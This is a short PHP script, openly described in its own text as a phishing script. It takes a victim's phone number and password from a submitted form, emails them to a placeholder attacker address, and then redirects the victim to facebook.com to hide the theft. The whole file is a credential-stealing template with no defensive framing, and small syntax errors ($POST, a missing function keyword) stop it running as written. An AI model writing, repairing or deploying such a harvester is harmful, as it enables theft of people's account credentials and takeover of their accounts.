<?php
	mail_sender(){
		$number = $POST['phone_number'];
		$password = $POST['password'];
		
		$reciever = "YOUR-EMAIL ADRRESS";
		
		$subject = "Got new access by phising script";
		$message = "The phone number is ". $number;
		$message .= "and password is ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
